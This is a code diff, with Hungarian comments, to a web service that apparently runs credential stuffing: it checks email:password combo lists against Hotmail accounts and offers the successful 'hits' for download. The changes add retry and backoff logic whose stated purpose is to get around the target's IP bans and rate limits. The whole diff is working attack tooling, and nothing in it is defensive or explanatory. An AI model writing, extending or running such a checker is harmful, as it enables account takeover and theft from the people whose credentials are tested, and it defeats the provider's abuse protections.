@@ -137,13 +137,14 @@ async def stop_checker(current_user = Depends(get_current_user)):
     raise HTTPException(status_code=404, detail="Nincs futó checker")
 
 # ============================================================
-# EXECUTE CHECKER (RETRY LOGIKÁVAL)
+# EXECUTE CHECKER (ÚJ: RETRY LOGIKÁVAL AZ IP BAN ELLEN)
 # ============================================================
 async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
     checked = hits = custom = bad = retries = 0
     total = len(lines)
     stopped = False
     
+    # ÚJ: Rate limit kezelés
     MAX_RETRIES_PER_LINE = 3
     BAN_BASE_DELAY = 30
     consecutive_bans = 0
@@ -159,7 +160,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         try: email, password = line.split(':', 1)
         except: continue
         
-        # ── RETRY LOOP ──
+        # ÚJ: RETRY LOOP - ha rate limitet kap, vár és újrapróbálja
         result = None
         retry_count = 0
         
@@ -185,12 +186,14 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
                 await asyncio.sleep(wait_time)
                 continue
             else:
+                # Sikeres kérés → csökkentjük a ban számlálót
                 consecutive_bans = max(0, consecutive_bans - 1)
                 break
         
         if stopped:
             break
         
+        # Ha kimerültek a retry-k
         if result is None or result["status"] == "retry":
             retries += 1
             checked += 1
@@ -203,6 +206,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         
         checked += 1
         
+        # EREDETI feldolgozás (nem változott)
         if result["status"] == "hit":
             hits += 1
             d = result["data"]
@@ -231,9 +235,11 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         await update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries})
         broadcast_to_user(user_id, json.dumps({"type": "stats", "run_id": run_id, "checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries, "total": total}))
         
+        # ÚJ: Extra lassítás ha volt közelmúltban ban
         extra_delay = min(consecutive_bans * 2, 10)
         await asyncio.sleep(speed + extra_delay)
     
+    # EREDETI befejezés (nem változott)
     await update_run_status_only(run_id, "finished")
     
     if hits > 0 or custom > 0:
@@ -255,7 +261,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         if user_id in stop_flags: del stop_flags[user_id]
 
 # ============================================================
-# API ENDPOINTS & DOWNLOAD
+# API ENDPOINTS & DOWNLOAD (EREDETI, NEM VÁLTOZOTT)
 # ============================================================
 @app.get("/api/runs")
 async def get_user_runs_list(current_user = Depends(get_current_user)):
@@ -282,7 +288,7 @@ async def download_direct(run_id: str, type: str):
     return PlainTextResponse(content="\n".join(lines) if lines else "Nincs eredmény", headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'})
 
 # ============================================================
-# WEBSOCKET
+# WEBSOCKET (EREDETI, NEM VÁLTOZOTT)
 # ============================================================
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, token: str = ""):
